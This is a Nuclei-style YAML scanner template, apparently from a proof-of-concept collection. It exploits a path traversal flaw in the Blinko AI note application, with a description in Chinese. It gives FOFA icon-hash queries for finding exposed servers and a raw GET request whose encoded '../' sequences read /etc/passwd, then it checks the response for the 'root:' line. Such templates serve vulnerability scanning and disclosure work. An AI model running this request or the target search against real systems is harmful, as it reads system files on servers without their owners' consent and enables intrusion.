id: blinko-ai-note-path-traversal

info:
  name: "Blinko AI 路径穿越导致敏感文件泄露"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: icon_hash="-1446811182" || icon_hash="-717082057"

    该漏洞允许攻击者通过构造恶意请求实现路径穿越，可能导致敏感文件泄露。
  tags: Blinko

http:
- raw:
  - |
    GET /api/file/temp/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
      - "root:[x*]:0:0"
